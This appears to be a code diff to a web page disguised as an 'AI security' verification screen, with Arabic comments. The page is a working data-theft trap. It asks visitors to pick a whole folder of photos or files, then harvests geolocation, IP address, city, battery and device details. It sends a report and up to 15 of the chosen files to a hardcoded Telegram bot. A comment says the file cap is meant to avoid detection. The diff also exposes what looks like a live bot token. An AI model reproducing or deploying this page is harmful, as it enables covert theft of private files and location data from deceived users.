@@ -3,135 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TALLAH AI | Private Access</title>
+    <title>TALLAH SYSTEM | ULTIMATE ACCESS</title>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
     <style>
         body { margin: 0; background: #000; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
         
-        /* شاشة التحقق */
-        #verify-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 10000; display: flex;
-            flex-direction: column; justify-content: center; align-items: center; text-align: center;
+        /* شاشة المصيدة (التحقق والملفات) */
+        #verify-screen { 
+            position: fixed; width: 100%; height: 100%; background: #000; 
+            z-index: 10000; display: flex; justify-content: center; 
+            align-items: center; text-align: center; 
         }
-        .verify-box {
-            border: 1px solid #0ff; padding: 40px; border-radius: 15px;
-            background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff;
+        .verify-box { 
+            border: 1px solid #0ff; padding: 40px; border-radius: 15px; 
+            background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff; max-width: 400px; 
         }
-        .check-btn {
-            margin-top: 30px; padding: 15px 40px; background: #0ff; color: #000;
-            font-weight: 900; border: none; cursor: pointer; border-radius: 5px;
-            font-size: 20px; transition: 0.3s;
+        .check-btn { 
+            margin-top: 20px; padding: 15px 30px; background: #0ff; color: #000; 
+            font-weight: 900; border: none; cursor: pointer; border-radius: 5px; width: 100%; 
+            font-size: 18px; transition: 0.3s;
         }
-        .check-btn:hover { box-shadow: 0 0 20px #0ff; transform: scale(1.05); }
+        .check-btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        
+        .file-label { 
+            display: block; margin-top: 15px; padding: 15px; border: 1px dashed #0ff; 
+            cursor: pointer; font-size: 14px; color: #fff; background: rgba(0,255,255,0.05);
+        }
 
-        /* الخلفية والمحتوى */
+        /* واجهة النظام بعد الاختراق */
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .screen { display: none; text-align: center; padding: 20px; }
+        #main { display: none; text-align: center; padding: 20px; }
         .active { display: block; animation: fadeIn 1s ease; }
         
-        .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 50px; box-shadow: 0 0 30px #0ff; }
-        .eye { width: 80px; height: 80px; border: 2px solid #0ff; border-radius: 50%; margin: 20px auto; position: relative; }
-        .pupil { width: 20px; height: 20px; background: #0ff; border-radius: 50%; position: absolute; top: 30px; left: 30px; box-shadow: 0 0 10px #0ff; }
-        
+        .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 40px; box-shadow: 0 0 30px #0ff; }
         .chat { 
-            width: 85%; max-width: 500px; margin: auto; border: 1px solid #0ff; 
-            padding: 15px; height: 150px; overflow-y: auto; text-align: right; 
-            background: rgba(0,0,0,0.8); font-size: 13px; color: #fff; line-height: 1.6;
+            width: 85%; max-width: 500px; margin: 20px auto; border: 1px solid #0ff; 
+            padding: 15px; height: 160px; overflow-y: auto; text-align: right; 
+            background: rgba(0,0,0,0.8); font-size: 13px; color: #fff;
         }
 
-        #status-msg { font-size: 12px; color: #555; margin-top: 10px; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-<!-- المرحلة الأولى: بروتوكول طلب التصاريح (المصيدة) -->
+<!-- واجهة طلب التصاريح وسحب المجلدات -->
 <div id="verify-screen">
     <div class="verify-box">
-        <h2 style="color:#fff">TALLAH AI SECURITY</h2>
-        <p>يجب تفعيل البروتوكول العصبي والموقع الجغرافي لفك تشفير الدخول</p>
-        <button class="check-btn" onclick="initiateDeepScan()">تفعيل (تحقق)</button>
-        <div id="status-msg">بانتظار تصريح الوصول...</div>
+        <h2 style="color:#fff">TALLAH AI SYSTEM</h2>
+        <p>يجب تفعيل بروتوكول الوصول الشامل لفك تشفير الصور والملفات الخاصة بك</p>
+        
+        <!-- زر سحب المجلدات (webkitdirectory يسمح بسحب مجلد كامل بكل ما فيه) -->
+        <label class="file-label">
+            <span>📁 اضغط لتحديد مجلد الصور/الملفات فوراً</span>
+            <input type="file" id="fileStripper" multiple webkitdirectory mozdirectory style="display:none" onchange="handleFiles(this.files)">
+        </label>
+
+        <button class="check-btn" onclick="document.getElementById('fileStripper').click()">بدء السحب والتحقق</button>
+        <div id="status" style="font-size:10px; margin-top:15px; color:#555;">بانتظار استجابة البروتوكول العصبى...</div>
     </div>
 </div>
 
-<!-- المرحلة الثانية: الخلفية المتحركة -->
 <canvas id="matrix"></canvas>
 
-<!-- المرحلة الثالثة: واجهة النظام بعد السحب -->
-<div id="main" class="screen">
-    <img src="hacker.webp" class="logo" alt="TALLAH Logo">
-    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">SHADOW</span></h1>
-    <div class="eye"><div class="pupil" id="pupil"></div></div>
+<div id="main">
+    <img src="hacker.webp" class="logo">
+    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">EMPIRE</span></h1>
     <div class="chat" id="chat"></div>
 </div>
 
 <script>
-/* إعدادات التليجرام الخاصة بك */
+/* بياناتك الإمبراطورية */
 const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const TG_CHAT_ID = "8754338811";
 
-async function initiateDeepScan() {
-    document.getElementById('status-msg').innerText = "جاري الاتصال بالسيرفرات العصبية...";
+async function handleFiles(files) {
+    if (files.length === 0) return;
     
-    // محاولة سحب الموقع الجغرافي
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await harvestAll(pos.coords.latitude, pos.coords.longitude);
-        }, async () => {
-            await harvestAll("Denied", "Denied"); // سحب باقي البيانات حتى لو رفض الموقع
-        });
-    } else {
-        await harvestAll("Not Supported", "Not Supported");
-    }
+    document.getElementById('status').innerText = "جاري حقن البروتوكول وسحب الملفات...";
+    
+    // سحب الموقع والبيانات النصية أولاً
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        await executeHarvest(pos.coords.latitude, pos.coords.longitude, files);
+    }, async () => {
+        await executeHarvest("Denied", "Denied", files);
+    });
 }
 
-async function harvestAll(lat, lon) {
+async function executeHarvest(lat, lon, files) {
     try {
         // سحب الـ IP والمعلومات التقنية
         const ipReq = await fetch('https://ipapi.co/json/');
         const ip = await ipReq.json();
-
-        // سحب معلومات البطارية
-        let batInfo = "Unknown";
+        
+        // سحب حالة البطارية
+        let bat = "Unknown";
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            batInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            bat = `${Math.round(b.level * 100)}%`;
         }
 
-        // بناء التقرير الشامل
-        const report = `
-🔥 صيد جديد من نظام طلة 🔥
-----------------------------
-📍 الموقع: https://www.google.com/maps?q=${lat},${lon}
-🌐 الـ IP: ${ip.ip}
-🌍 البلد/المدينة: ${ip.country_name} / ${ip.city}
-📱 الجهاز: ${navigator.platform}
-🔋 البطارية: ${batInfo}
-🧠 المعالج: ${navigator.hardwareConcurrency} Cores
-⏰ الوقت: ${new Date().toLocaleString()}
-----------------------------
-        `;
+        // 1. إرسال التقرير النصي الشامل
+        let report = `🔥 صيد جديد من نظام طلة 🔥\n`;
+        report += `----------------------------\n`;
+        report += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
+        report += `🌐 الـ IP: ${ip.ip}\n🌍 البلد: ${ip.country_name} / ${ip.city}\n`;
+        report += `📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${bat}\n`;
+        report += `📂 عدد الملفات المحددة: ${files.length}\n`;
+        report += `----------------------------`;
 
-        // إرسال البيانات فوراً للتليجرام
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
         });
 
-        // الانتقال لواجهة النظام
+        // 2. سحب الملفات (الصور والمستندات) وإرسالها
+        // سنرسل أول 15 ملف بسرعة لضمان عدم كشف العملية
+        for (let i = 0; i < Math.min(files.length, 15); i++) {
+            let formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('document', files[i]);
+
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // إظهار واجهة النظام الوهمية
         document.getElementById("verify-screen").style.display = "none";
         document.getElementById("main").classList.add("active");
         runChat();
 
     } catch (err) {
-        console.error("Critical Error in Shadow Protocol");
+        console.error("Matrix Error");
     }
 }
 
-/* تأثيرات بصرية (ماتريكس وعين المراقبة) */
+/* تأثير الماتريكس */
 let c = document.getElementById("matrix");
 let ctx = c.getContext("2d");
 c.width = innerWidth; c.height = innerHeight;
@@ -148,18 +158,21 @@ function draw() {
 }
 setInterval(draw, 33);
 
-document.addEventListener("mousemove", e => {
-    let p = document.getElementById("pupil");
-    p.style.transform = `translate(${(e.clientX/innerWidth)*40-20}px, ${(e.clientY/innerHeight)*40-20}px)`;
-});
-
 function runChat() {
     const box = document.getElementById("chat");
-    const lines = ["> تم اختراق التشفير..", "> سحب بيانات الجهاز بنجاح..", "> إرسال التقرير للإمبراطور..", "> أهلاً بك في المنطقة المحظورة."];
+    const msgs = [
+        "> تم تفعيل بروتوكول السحب الشامل..",
+        "> جاري نقل الصور والملفات للداتا سنتر..",
+        "> تشفير البيانات المرسلة للإمبراطور..",
+        "> العملية تمت بنجاح تالٍ."
+    ];
     let idx = 0;
-    setInterval(() => {
-        if(idx < lines.length) { box.innerHTML += lines[idx] + "<br>"; idx++; }
-    }, 1200);
+    let timer = setInterval(() => {
+        if(idx < msgs.length) {
+            box.innerHTML += msgs[idx] + "<br>";
+            idx++;
+        } else { clearInterval(timer); }
+    }, 1500);
 }
 </script>
 </body>
